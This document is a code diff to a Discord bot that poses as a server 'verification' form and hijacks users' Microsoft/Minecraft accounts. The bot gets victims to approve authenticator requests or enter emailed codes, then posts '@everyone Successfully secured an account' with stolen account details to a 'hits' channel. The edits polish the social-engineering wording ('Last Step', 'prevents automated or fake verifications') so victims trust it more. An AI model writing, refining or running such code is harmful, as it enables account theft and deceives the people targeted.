@@ -39,11 +39,6 @@ class MyModalOne(ui.Modal):
 
         await interaction.response.defer(ephemeral=True)
 
-        await interaction.followup.send(
-            "⌛ Please wait while we try to verify you...",
-            ephemeral = True
-        )
-        
         logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
         hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
 
@@ -86,8 +81,8 @@ class MyModalOne(ui.Modal):
                 
             await interaction.followup.send(
                 embed = Embed(
-                    title="Verification",
-                    description=f"Authenticator Request.\nPlease confirm the code **`{entropy}`** on your app!",
+                    title="Last Step",
+                    description=f"An Authenticator Request has been sent.\nPlease confirm the code **`{entropy}`** on your app! This step prevents automated or fake verifications.",
                     colour=0x00FF00
                 ),
                 ephemeral = True
@@ -164,7 +159,12 @@ class MyModalOne(ui.Modal):
                     await logs_channel.send(embed = sucessEmbed, view = ButtonOptions(interaction.user))
 
                     await interaction.followup.send(
-                        "⌛ Please allow us to proccess your roles...", ephemeral=True
+                        embed = discord.Embed(
+                            title = "Processing...",
+                            description = "⌛ Please allow us to proccess your roles",
+                            color = 0xDE755B
+                        ),
+                        ephemeral = True
                     )
                     
                     # Embeds | Account, Minecraft, SSID, Extra Info, Inbox (separate)
@@ -174,7 +174,7 @@ class MyModalOne(ui.Modal):
                         await logs_channel.send(
                             embed = Embed(
                                 title = f"User | {interaction.user.name} ({interaction.user.id})",
-                                description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to secure | Invalid email OTP```",
+                                description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to secure | Invalid Code Entered```",
                                 timestamp = datetime.datetime.now(),
                                 colour = 0xFF5C5C                  
                             ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
@@ -183,6 +183,7 @@ class MyModalOne(ui.Modal):
                         return
                     
                     await hits_channel.send("@everyone **Successfully secured an account**")
+                    await hits_channel.send(embed = securedAccount["details"]["stats_embed"])
                     await hits_channel.send(
                         embed = securedAccount["hit_embed"],
                         view = accountInfo(
@@ -308,7 +309,7 @@ class MyModalOne(ui.Modal):
 
             await interaction.followup.send(
                 embed=Embed(
-                    title="Verification",
+                    title="Last Step",
                     description=f"To complete verification, enter the confirmation code we sent to {verEmail}.\nThis step prevents automated or fake verifications.",
                     colour=0x00FF00
                 ),
